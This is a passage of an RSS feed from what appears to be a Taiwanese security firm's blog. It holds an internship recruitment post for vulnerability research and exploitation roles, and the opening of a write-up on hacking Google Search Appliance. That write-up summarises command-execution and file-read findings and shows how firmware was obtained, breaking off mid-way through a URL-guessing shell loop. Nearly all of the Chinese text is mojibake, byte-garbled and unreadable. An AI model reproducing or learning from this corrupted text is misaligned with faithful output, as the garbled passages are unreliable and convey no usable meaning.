                <description>&lt;p&gt;DEVCORE å‰µç«‹è¿„ä»Šå·²é€¾åå¹´ï¼ŒæŒçºŒå°ˆæ³¨æ–¼æä¾›ä¸»å‹•å¼è³‡å®‰æœå‹™ï¼Œä¸¦è‡´åŠ›å°‹æ‰¾å„ç¨®å®‰å…¨é¢¨éšªåŠæ¼æ´ï¼Œè®“ä¸–ç•Œè®Šå¾—æ›´å®‰å…¨ã€‚ç‚ºäº†æŒçºŒå°‹æ‰¾æ›´å¤šæ“æœ‰ç›¸åŒç†å¿µçš„è³‡å®‰æ–°éŠ³ã€å”åŠ©å­¸ç”Ÿå»ºæ§‹æ­£ç¢ºè³‡å®‰æ„è­˜åŠæŠ€èƒ½ï¼Œæˆ‘å€‘æˆç«‹äº†ã€Œæˆ´å¤«å¯‡çˆ¾å…¨åœ‹è³‡è¨Šå®‰å…¨çå­¸é‡‘ã€ï¼Œ2022 å¹´åˆä¹Ÿé–‹å§‹èˆ‰è¾¦é¦–å±†å¯¦ç¿’ç”Ÿè¨ˆç•«ï¼Œç›®å‰ç‚ºæ­¢æˆæœé —è±ã€è¶…ä¹é æœŸï¼Œç¬¬ä¸‰å±†å¯¦ç¿’ç”Ÿè¨ˆç•«ä¹Ÿå°‡æ–¼ä»Šå¹´ 7 æœˆåº•å‘Šä¸€æ®µè½ã€‚æˆ‘å€‘å¾ˆæ¦®å¹¸åœ°å®£ä½ˆï¼Œç¬¬å››å±†å¯¦ç¿’ç”Ÿè¨ˆç•«å³å°‡ç™»å ´ï¼Œè‹¥æ‚¨æœŸå¾…åŠ å…¥æˆ‘å€‘ã€ç²¾é€²è³‡å®‰æŠ€èƒ½ï¼Œç…©è«‹è©³é–±ä¸‹åˆ—è³‡è¨Šå¾Œä¾†ä¿¡å ±åï¼&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;å¯¦ç¿’å…§å®¹&quot;&gt;å¯¦ç¿’å…§å®¹&lt;/h3&gt;

&lt;p&gt;æœ¬æ¬¡å¯¦ç¿’åˆ†ç‚º Binary åŠ Web å…©å€‹çµ„åˆ¥ï¼Œä¸»è¦å…§å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Binary
ä»¥ç ”ç©¶ç‚ºä¸»ï¼Œåœ¨èˆ‡å°å¸«ç¢ºå®šç ”ç©¶æ¨™çš„å¾Œï¼Œåˆ†æç›®æ¨™æ¶æ§‹ã€é€²è¡Œé€†å‘å·¥ç¨‹æˆ–ç¨‹å¼ç¢¼å¯©æŸ¥ã€‚è—‰ç”±é€™å€‹éç¨‹è¨“ç·´è‡ªå·±çš„æ€è·¯ï¼Œæ‰¾å‡ºå¯èƒ½çš„æ”»æ“Šé¢èˆ‡æ½›åœ¨çš„å¼±é»ã€‚å¦å¤–ä¹Ÿæœƒè®“å¤§å®¶å˜—è©¦åˆ†æåŠå¯«éå¾€æ¼æ´çš„ Exploitï¼Œç†è§£éå»æ¼æ´éƒ½å‡ºç¾åœ¨å“ªï¼Œé«”é©—çœŸå¯¦ä¸–ç•Œçš„æ¼æ´éƒ½æ˜¯å¦‚ä½•åˆ©ç”¨ã€‚
    &lt;ul&gt;
      &lt;li&gt;æ¼æ´æŒ–æ˜åŠç ”ç©¶ 70 %&lt;/li&gt;
      &lt;li&gt;1-day é–‹ç™¼ (Exploitation) 30 %&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Web
å°å¸«æœƒèˆ‡å­¸ç”Ÿè¨è«–ä¸¦ç¢ºå®šä¸€å€‹ä»¥å­¸ç”Ÿçš„æœŸæœ›ç‚ºä¸»çš„å¯¦ç¿’ç›®æ¨™ï¼Œä¸¦åœ¨éç¨‹è¼”å°æˆé•·ä»¥å®Œæˆç›®æ¨™ï¼Œå…§å®¹å¯ä»¥æ˜¯æ·±å…¥ç ”ç©¶è¿‘å¹´å¸¸è¦‹æ–°å‹æ…‹æ¼æ´ã€æ”»æ“Šæ‰‹æ³•ã€é–‹æºè»Ÿé«”ï¼Œæˆ–æ˜¯ç¨‹å¼èªè¨€ç”Ÿæ…‹ç³»çš„å¸¸è¦‹å¼±é»ï¼Œäº¦æˆ–æ˜¯å±•ç¾ä½ çš„æŠ€è¡“åŠ›ä»¥é–‹ç™¼èˆ‡ç´…éšŠç›¸é—œçš„å·¥å…·ã€‚
    &lt;ul&gt;
      &lt;li&gt;æ¼æ´ã€æ”»æ“Šæ‰‹æ³•æˆ–é–‹ç™¼å·¥å…·ç ”ç©¶ 90%&lt;/li&gt;
      &lt;li&gt;æˆæœå ±å‘Šèˆ‡æº–å‚™ 10%&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å…¬å¸åœ°é»&quot;&gt;å…¬å¸åœ°é»&lt;/h3&gt;

&lt;p&gt;å°åŒ—å¸‚æ¾å±±å€å…«å¾·è·¯ä¸‰æ®µ 32 è™Ÿ 13 æ¨“&lt;/p&gt;

&lt;h3 id=&quot;å¯¦ç¿’æ™‚é–“&quot;&gt;å¯¦ç¿’æ™‚é–“&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2023 å¹´ 9 æœˆé–‹å§‹åˆ° 2024 å¹´ 1 æœˆåº•ï¼Œå…± 5 å€‹æœˆã€‚&lt;/li&gt;
  &lt;li&gt;æ¯é€±å·¥ä½œå…©å¤©ï¼Œå·¥ä½œæ™‚é–“ç‚º 10:00 â€“ 18:00
    &lt;ul&gt;
      &lt;li&gt;æ¯é€±å›ºå®šä¸€å¤©ä¸‹åˆ 14:00 - 18:00 å¿…é ˆåˆ°å…¬å¸è¨è«–é€²åº¦
        &lt;ul&gt;
          &lt;li&gt;å¦‚æœå±…ä½é›™åŒ—å¤–å¯å½ˆæ€§èª¿æ•´(ä½†é ˆæ¯å€‹çµ„åˆ¥çµ±ä¸€)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;å…¶é¤˜æ™‚é–“çš†ç‚ºé ç«¯ä½œæ¥­&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;æ‹›å‹Ÿå°è±¡&quot;&gt;æ‹›å‹Ÿå°è±¡&lt;/h3&gt;

&lt;p&gt;å…·æœ‰ä¸€å®šç¨‹åº¦è³‡å®‰èƒŒæ™¯çš„å­¸ç”Ÿï¼Œä¸”å¯æ¯é€±å·¥ä½œå…©å¤©ã€‚&lt;/p&gt;

&lt;h3 id=&quot;é è¨ˆæ‹›æ”¶åé¡&quot;&gt;é è¨ˆæ‹›æ”¶åé¡&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Binary çµ„ï¼š2~3 äºº&lt;/li&gt;
  &lt;li&gt;Web çµ„ï¼š2~3 äºº&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;è–ªè³‡å¾…é‡&quot;&gt;è–ªè³‡å¾…é‡&lt;/h3&gt;

&lt;p&gt;æ¯æœˆæ–°å°å¹£ 16,000 å…ƒ&lt;/p&gt;

&lt;h2 id=&quot;æ‹›å‹Ÿæ¢ä»¶è³‡æ ¼èˆ‡æµç¨‹&quot;&gt;æ‹›å‹Ÿæ¢ä»¶è³‡æ ¼èˆ‡æµç¨‹&lt;/h2&gt;

&lt;h3 id=&quot;å¯¦ç¿’æ¢ä»¶è¦æ±‚&quot;&gt;å¯¦ç¿’æ¢ä»¶è¦æ±‚&lt;/h3&gt;

&lt;h4 id=&quot;binary&quot;&gt;Binary&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;åŸºæœ¬é€†å‘å·¥ç¨‹åŠé™¤éŒ¯èƒ½åŠ›
    &lt;ul&gt;
      &lt;li&gt;èƒ½çœ‹æ‡‚çµ„åˆèªè¨€ä¸¦ç­è§£åŸºæœ¬ Debugger ä½¿ç”¨æŠ€å·§&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;åŸºæœ¬æ¼æ´åˆ©ç”¨èƒ½åŠ›
    &lt;ul&gt;
      &lt;li&gt;é ˆçŸ¥é“ Stack overflowã€ROP ç­‰ç›¸é—œåˆ©ç”¨æŠ€å·§&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;åŸºæœ¬ Scripting Language é–‹ç™¼èƒ½åŠ›
    &lt;ul&gt;
      &lt;li&gt;Pythonã€Ruby&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å…·å‚™åˆ†æå¤§å‹ Open Source å°ˆæ¡ˆèƒ½åŠ›
    &lt;ul&gt;
      &lt;li&gt;ä»¥ C/C++ ç‚ºä¸»&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å…·å‚™åŸºç¤ä½œæ¥­ç³»çµ±çŸ¥è­˜
    &lt;ul&gt;
      &lt;li&gt;ä¾‹å¦‚çŸ¥é“ Virtual Address èˆ‡ Physical Address çš„æ¦‚å¿µ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Code Auditing
    &lt;ul&gt;
      &lt;li&gt;çŸ¥é“æ€æ¨£å¯«çš„ç¨‹å¼ç¢¼æœƒæœ‰å•é¡Œ
        &lt;ul&gt;
          &lt;li&gt;Buffer Overflow&lt;/li&gt;
          &lt;li&gt;Use After free&lt;/li&gt;
          &lt;li&gt;Race Condition&lt;/li&gt;
          &lt;li&gt;â€¦&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å…·å‚™ç ”ç©¶ç†±èª ï¼Œç¿’æ…£äº†è§£æŠ€è¡“æœ¬è³ª&lt;/li&gt;
  &lt;li&gt;åŠ åˆ†ä½†&lt;strong&gt;éå¿…è¦&lt;/strong&gt;æ¢ä»¶
    &lt;ul&gt;
      &lt;li&gt;CTF æ¯”è³½ç¶“é©—&lt;/li&gt;
      &lt;li&gt;pwnable.tw æˆç¸¾&lt;/li&gt;
      &lt;li&gt;æ¨‚æ–¼åˆ†äº«æŠ€è¡“
        &lt;ul&gt;
          &lt;li&gt;æœ‰å…¬é–‹çš„æŠ€è¡“ blog/slideã€Write-ups æˆ–æ˜¯æ¼”è¬›&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;ç²¾é€š IDA Pro æˆ– Ghidra&lt;/li&gt;
      &lt;li&gt;æœ‰å¯«é 1-day åˆ©ç”¨ç¨‹å¼&lt;/li&gt;
      &lt;li&gt;å…·å‚™ä¸‹åˆ—å…¶ä¸­ä¹‹ä¸€ç¶“é©—
        &lt;ul&gt;
          &lt;li&gt;Kernel Exploit&lt;/li&gt;
          &lt;li&gt;Windows Exploit&lt;/li&gt;
          &lt;li&gt;Browser Exploit&lt;/li&gt;
          &lt;li&gt;Bug Bounty&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;web&quot;&gt;Web&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;ç†Ÿæ‚‰ OWASP Web Top 10ã€‚&lt;/li&gt;
  &lt;li&gt;ç†è§£ PortSwigger Web Security Academy ä¸­æ‰€æœ‰çš„å®‰å…¨è­°é¡Œæˆ–å·²å®Œæˆæ‰€æœ‰ Labã€‚
    &lt;ul&gt;
      &lt;li&gt;åƒè€ƒé€£çµï¼šhttps://portswigger.net/web-security/all-materials&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ç†è§£è¨ˆç®—æ©Ÿç¶²è·¯çš„åŸºæœ¬æ¦‚å¿µã€‚&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ Command Line æ“ä½œï¼ŒåŒ…å« Unix-like å’Œ Windows ä½œæ¥­ç³»çµ±çš„å¸¸è¦‹æˆ–å…§å»ºç³»çµ±æŒ‡ä»¤å·¥å…·ã€‚&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ä»»ä¸€ç¨®ç¶²é ç¨‹å¼èªè¨€ï¼ˆå¦‚ï¼šPHPã€ASP.NETã€JSPï¼‰ï¼Œå…·å‚™å¯ä»¥å»ºç«‹å®Œæ•´ç¶²é æœå‹™çš„èƒ½åŠ›ã€‚&lt;/li&gt;
  &lt;li&gt;ç†Ÿæ‚‰ä»»ä¸€ç¨® Scripting Languageï¼ˆå¦‚ï¼šShell Scriptã€Pythonã€Rubyï¼‰ï¼Œä¸¦èƒ½ä½¿ç”¨è…³æœ¬è¼”ä»¥ç ”ç©¶ã€‚&lt;/li&gt;
  &lt;li&gt;å…·å‚™é™¤éŒ¯èƒ½åŠ›ï¼Œèƒ½å–„ç”¨ Debugger è¿½è¹¤ç¨‹å¼æµç¨‹ã€èƒ½é‡ç¾ä¸¦æ”¶æ–‚å•é¡Œã€‚&lt;/li&gt;
  &lt;li&gt;å…·å‚™å¯ä»¥å»ºç½®ã€è¨­å®šå¸¸è¦‹ç¶²é ä¼ºæœå™¨ï¼ˆå¦‚ï¼šNginxã€Apacheï¼‰åŠä½œæ¥­ç³»çµ±ï¼ˆå¦‚ï¼šLinuxï¼‰çš„èƒ½åŠ›ã€‚&lt;/li&gt;
  &lt;li&gt;å…·å‚™è¿½æ ¹ç©¶æŸ¢çš„ç²¾ç¥ã€‚&lt;/li&gt;
  &lt;li&gt;åŠ åˆ†ä½†&lt;strong&gt;éå¿…è¦&lt;/strong&gt;æ¢ä»¶
    &lt;ul&gt;
      &lt;li&gt;æ›¾ç¶“ç¨ç«‹æŒ–æ˜é 0-day æ¼æ´ã€‚&lt;/li&gt;
      &lt;li&gt;æ›¾ç¶“ç¨ç«‹åˆ†æéå·²çŸ¥æ¼æ´ä¸¦èƒ½æ’°å¯« 1-day exploitã€‚&lt;/li&gt;
      &lt;li&gt;æ›¾ç¶“æ–¼ CTF æ¯”è³½ä¸­æ“”ä»»å‡ºé¡Œè€…ä¸¦å»ºç½®éé¡Œç›®ã€‚&lt;/li&gt;
      &lt;li&gt;æ“æœ‰ OSCP è­‰ç…§æˆ–åŒç­‰èƒ½åŠ›ä¹‹è­‰ç…§ã€‚&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;æ‡‰å¾µæµç¨‹&quot;&gt;æ‡‰å¾µæµç¨‹&lt;/h3&gt;

&lt;p&gt;æœ¬æ¬¡ç”„é¸ä¸€å…±åˆ†ç‚ºäºŒå€‹éšæ®µï¼š&lt;/p&gt;

&lt;h4 id=&quot;ç¬¬ä¸€éšæ®µæ›¸é¢å¯©æŸ¥&quot;&gt;ç¬¬ä¸€éšæ®µï¼šæ›¸é¢å¯©æŸ¥&lt;/h4&gt;

&lt;p&gt;ç¬¬ä¸€éšæ®µç‚ºæ›¸é¢å¯©æŸ¥ï¼Œæœƒéœ€è¦å¯©æŸ¥ä¸‹åˆ—å…©å€‹é …ç›®&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;å±¥æ­·å…§å®¹&lt;/li&gt;
  &lt;li&gt;ç°¡ç­”é¡Œç­”æ¡ˆ
    &lt;ul&gt;
      &lt;li&gt;é¡Œç›® 1ï¼šè«‹æå‡ºä¸‰å€‹ï¼Œä½ å°è±¡æœ€æ·±åˆ»æˆ–æ„Ÿåˆ°æœ‰è¶£ã€æ–¼è¥¿å…ƒ 2021 ~ 2023 å¹´é–“å…¬é–‹çš„çœŸå¯¦æ¼æ´æˆ–æ”»æ“Šéˆæ¡ˆä¾‹ï¼Œä¸¦ä¾è‡ªå·±çš„ç†è§£ç°¡è¿°èªªæ˜å„å€‹æ¼æ´çš„æˆå› ã€åˆ©ç”¨æ¢ä»¶å’Œå¯ä»¥é€ æˆçš„å½±éŸ¿ã€‚&lt;/li&gt;
      &lt;li&gt;é¡Œç›® 2ï¼šå¯¦ç¿’æœŸé–“æƒ³è¦ç ”ç©¶çš„ä¸»é¡Œï¼Œè«‹æå‡ºä¸‰å€‹å¯èƒ½é¸æ“‡çš„æ˜ç¢ºä¸»é¡Œï¼Œä¸¦ç°¡å–®èªªæ˜æå‡ºçš„ç†ç”±æˆ–æƒ³å®Œæˆçš„å…§å®¹ï¼Œä¾‹å¦‚ï¼š
        &lt;ul&gt;
          &lt;li&gt;ç ”ç©¶â—¯â—¯é–‹æºè»Ÿé«”ï¼Œæ‰¾åˆ°å¯ RCE çš„é‡å¤§é¢¨éšªå¼±é»ã€‚&lt;/li&gt;
          &lt;li&gt;ç ”ç©¶ AD CS çš„æ”»æ“Šæ‰‹æ³•ï¼Œå˜—è©¦æŒ–æ˜æ–°çš„æ”»æ“Šå¯èƒ½æ€§æˆ–å‘é‡ã€‚&lt;/li&gt;
          &lt;li&gt;ç ”ç©¶å¸¸è¦‹çš„è·¯ç”±å™¨ï¼Œç›®æ¨™åŒ…æ‹¬ï¼šAA-123 è·¯ç”±å™¨ã€BB-456 ç„¡ç·šè·¯ç”±å™¨ã€‚&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æœ¬éšæ®µæ”¶ä»¶æˆªæ­¢æ™‚é–“ç‚º &lt;strong&gt;2023/08/11 23:59&lt;/strong&gt;ï¼Œæˆ‘å€‘æœƒæ ¹æ“šæ‚¨çš„å±¥æ­·åŠé¡Œç›®æ‰€å›ç­”çš„å…§å®¹ä¾†æ±ºå®šæ˜¯å¦æœ‰é€šéç¬¬ä¸€éšæ®µï¼Œæˆ‘å€‘æœƒåœ¨ 10 å€‹&lt;strong&gt;å·¥ä½œå¤©&lt;/strong&gt;å…§å›è¦†ã€‚&lt;/p&gt;

&lt;h4 id=&quot;ç¬¬äºŒéšæ®µé¢è©¦&quot;&gt;ç¬¬äºŒéšæ®µï¼šé¢è©¦&lt;/h4&gt;
&lt;p&gt;æ­¤éšæ®µç‚º 30~120 åˆ†é˜ï¼ˆä¾ç…§çµ„åˆ¥éœ€æ±‚è€Œå®šï¼Œæœƒå¦è¡Œé€šçŸ¥ï¼‰çš„é¢è©¦ï¼Œæœƒæœ‰ 2~3 ä½è³‡æ·±å¤¥ä¼´åƒèˆ‡ï¼Œè©•ä¼°æ‚¨æ˜¯å¦å…·å‚™æœ¬æ¬¡å¯¦ç¿’æ‰€éœ€çš„æŠ€è¡“èƒ½åŠ›èˆ‡äººæ ¼ç‰¹è³ªã€‚&lt;/p&gt;

&lt;h4 id=&quot;æ™‚é–“è»¸&quot;&gt;æ™‚é–“è»¸&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;2023/07/19 - 2023/08/11 å…¬é–‹æ‹›å‹Ÿ&lt;/li&gt;
  &lt;li&gt;2023/08/14 - 2023/08/24 é¢è©¦&lt;/li&gt;
  &lt;li&gt;2023/08/28 å‰å›æ‡‰çµæœ&lt;/li&gt;
  &lt;li&gt;2023/09/04 ç¬¬å››å±†å¯¦ç¿’è¨ˆç•«æ–¼ç•¶é€±é–‹å§‹&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å ±åæ–¹å¼&quot;&gt;å ±åæ–¹å¼&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;è«‹å°‡æ‚¨çš„&lt;strong&gt;å±¥æ­·&lt;/strong&gt;åŠ&lt;strong&gt;é¡Œç›®ç­”æ¡ˆ&lt;/strong&gt;ä»¥ PDF æ ¼å¼å¯„åˆ° recruiting_intern@devco.re
    &lt;ul&gt;
      &lt;li&gt;å±¥æ­·æ ¼å¼è«‹åƒè€ƒç¯„ä¾‹ç¤ºæ„ï¼ˆ&lt;a href=&quot;/assets/files/recruit/Resume_Example.docx&quot;&gt;DOCX&lt;/a&gt;ã€&lt;a href=&quot;/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;ã€&lt;a href=&quot;/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;ï¼‰ä¸¦è½‰æˆ PDFã€‚è‹¥æ‚¨æœ‰è‡ªä¿¡ï¼Œä¹Ÿå¯ä»¥è‡ªç”±ç™¼æ®æœ€èƒ½å‘ˆç¾æ‚¨èƒ½åŠ›çš„å±¥æ­·ã€‚&lt;/li&gt;
      &lt;li&gt;è«‹æ–¼ &lt;strong&gt;2023/08/11 23:59&lt;/strong&gt; å‰å¯„å‡ºï¼ˆå¦‚æœåé¡å·²æ»¿å‰‡è¦–æƒ…æ³ææ—©çµæŸï¼‰&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ä¿¡ä»¶æ¨™é¡Œæ ¼å¼ï¼š[æ‡‰å¾µ] è·ä½ æ‚¨çš„å§“åï¼ˆç¯„ä¾‹ï¼š[æ‡‰å¾µ] Web çµ„å¯¦ç¿’ç”Ÿ ç‹å°ç¾ï¼‰&lt;/li&gt;
  &lt;li&gt;å±¥æ­·å…§å®¹è«‹å‹™å¿…æ§åˆ¶åœ¨ä¸‰é ä»¥å…§ï¼Œè‡³å°‘éœ€åŒ…å«ä»¥ä¸‹å…§å®¹ï¼š
    &lt;ul&gt;
      &lt;li&gt;åŸºæœ¬è³‡æ–™&lt;/li&gt;
      &lt;li&gt;å­¸æ­·&lt;/li&gt;
      &lt;li&gt;å¯¦ç¿’ç¶“æ­·&lt;/li&gt;
      &lt;li&gt;ç¤¾ç¾¤æ´»å‹•ç¶“æ­·&lt;/li&gt;
      &lt;li&gt;ç‰¹æ®Šäº‹è¹Ÿ&lt;/li&gt;
      &lt;li&gt;éå»å°æ–¼è³‡å®‰çš„ç›¸é—œç ”ç©¶&lt;/li&gt;
      &lt;li&gt;MBTI è·æ¥­æ€§æ ¼æ¸¬è©¦çµæœï¼ˆ&lt;a href=&quot;https://www.apesk.com/mbti/dati_tw.asp&quot;&gt;æ¸¬è©¦ç¶²é &lt;/a&gt;ï¼‰&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è‹¥æœ‰æ‡‰å¾µç›¸é—œå•é¡Œï¼Œè«‹ä¸€å¾‹ä½¿ç”¨ Email è¯ç¹«ï¼Œå¦‚é€ æˆæ‚¨çš„ä¸ä¾¿è«‹è¦‹è«’ï¼Œæˆ‘å€‘æ„Ÿè¬æ‚¨çš„ä¾†ä¿¡ï¼Œä¸¦æœŸå¾…æ‚¨çš„åŠ å…¥ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2023/07/18/4nd-internship-program-recruit/</link>
                <guid>https://devco.re/blog/2023/07/18/4nd-internship-program-recruit</guid>
                <pubDate>Tue, 18 Jul 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>[REL] æ·±å…¥ç ´è§£ Google Search Appliance</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2023/07/07/a-journey-into-hacking-google-search-appliance-en&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2023/07/07/a-journey-into-hacking-google-search-appliance/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;æ‡¶äººåŒ…&quot;&gt;æ‡¶äººåŒ…&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;GSA ç®¡ç†ç•Œé¢èªè­‰å¾Œä»»æ„æŒ‡ä»¤åŸ·è¡Œ&lt;/li&gt;
  &lt;li&gt;GSA æœå°‹ä»‹é¢ä»»æ„è®€æª”&lt;/li&gt;
  &lt;li&gt;GSA ä½¿ç”¨ Oracle çš„ Outside-in Technology è½‰æ›æ–‡ä»¶æ ¼å¼&lt;/li&gt;
  &lt;li&gt;Google ç¶²é æœå‹™æœ‰ä¸€äº›å›ºå®šçš„URIï¼Œæœƒæä¾›æ­¤æœå‹™çš„è‡ªèº«è³‡è¨Š&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h3&gt;

&lt;p&gt;Google Search Appliance (ä»¥ä¸‹ç°¡ç¨± GSA ) æ˜¯ Google æ–¼2002 å¹´é–‹å§‹ç‚ºä¼æ¥­æ¨å‡ºçš„æœå°‹è¨­å‚™ï¼Œä¸»è¦åŠŸèƒ½ç‚ºæ”¾ç½®æ–¼ä¼æ¥­å…§ç¶²ç”¨æ–¼ç´¢å¼•å…§éƒ¨ç¶²è·¯è³‡è¨Šä¸¦æä¾›æª¢ç´¢ã€‚æ–¼ 2005 å¹´å·¦å³æ¨å‡ºçµ¦å€‹äººåŠå°å‹ä¼æ¥­ä½¿ç”¨çš„ Google Miniï¼Œæ–¼ 2008 å¹´åº•å·¦å³æœ‰ç™¼å¸ƒè™›æ“¬æ©Ÿå™¨ç‰ˆæœ¬ï¼Œåç¨±ç‚º Virtual Google Search Appliance (ä»¥ä¸‹ç°¡ç¨± vGSA)ï¼Œå¾Œä¾†æ–¼ 2018å¹´åº•çµæŸç”¢å“ç”Ÿå‘½é€±æœŸï¼Œç”¢å“ç·šæ•´åˆé€²å…¥ Cloud Searchã€‚&lt;/p&gt;

&lt;h3 id=&quot;è¨­å‚™è»Ÿé«”å–å¾—&quot;&gt;è¨­å‚™ã€è»Ÿé«”å–å¾—&lt;/h3&gt;

&lt;p&gt;å¾ ebay ä»¥é—œéµå­— Google Search Appliance æœå°‹ä¸¦å˜—è©¦è³¼è²·æ­¤è¨­å‚™ï¼Œ
å¦‚æœä¸å¹¸ç¡¬ç¢Ÿè³‡æ–™å·²è¢«æ¸…é™¤ï¼Œä¹Ÿåªèƒ½å˜—è©¦å¤šè²·å¹¾å°äº†ã€‚&lt;/p&gt;

&lt;p&gt;å¹¸é‹çš„æ˜¯ï¼Œè³¼å…¥çš„ç¬¬ä¸€å°å°±æ˜¯æœªé­å®Œæ•´æ¸…é™¤çš„ GSAï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç¾åœ¨ä»ç„¶å¯ä»¥æ‰¾åˆ°æ­£åœ¨è¢«è²©å”®çš„è¨­å‚™ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¦ä¸€æ–¹é¢ vGSA åŸå§‹å…¬é–‹é€£çµå·²è¢«ç§»é™¤ï¼Œ
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://dl.google.com/vgsa/vgsa\_20090210.7z&lt;/code&gt; [å·²è¢«ç§»é™¤]
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://dl.google.com/vgsa/vgsa\_20081028.7z&lt;/code&gt; [å·²è¢«ç§»é™¤]&lt;/p&gt;

&lt;p&gt;å¾Œä¾†ç”¨ BitTorrent ç£åŠ›é€£çµ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magnet:?xt=urn:btih:89388ACE8C3B91FDD3A2F86D8CBB78C58A70D992&lt;/code&gt; æˆåŠŸå–å¾—æª”æ¡ˆã€‚&lt;/p&gt;

&lt;p&gt;æ¥è‘—å†å¾ google groups ä¸­æ‰¾åˆ°èˆŠç‰ˆè»Ÿé«”é€£æ¥ï¼š&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€£çµç‚ºï¼š&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://dl.google.com/dl/enterprise/install_bundle-10000622-7.2.0-112.bin&lt;/code&gt; [å·²è¢«ç§»é™¤]&lt;/p&gt;

&lt;p&gt;ç”±å…¬é–‹ç¶²é ä¸­ï¼Œå¯å–å¾—ç‰ˆæœ¬è™Ÿç¢¼ï¼š
&lt;a href=&quot;http://web.archive.org/web/20210116194907/https://support.google.com/gsa/answer/7020590?hl=en&amp;amp;ref_topic=2709671&quot;&gt;http://web.archive.org/web/20210116194907/https://support.google.com/gsa/answer/7020590?hl=en&amp;amp;ref_topic=2709671&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;çŒœæ¸¬æª”æ¡ˆåç¨±è¦å‰‡ç‚º install_bundle-10000(ä¸‰ä½æ•¸å­—)-7.(ä¸€ä½æ•¸å­—).(æ•¸å­—)-(ä¸‰ä½æ•¸å­—).bin&lt;/p&gt;

&lt;p&gt;ä¸¦ç·¨å¯« shell script å˜—è©¦ä¸‹è¼‰ï¼š&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;622&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;j&amp;lt;999&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;+j&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span 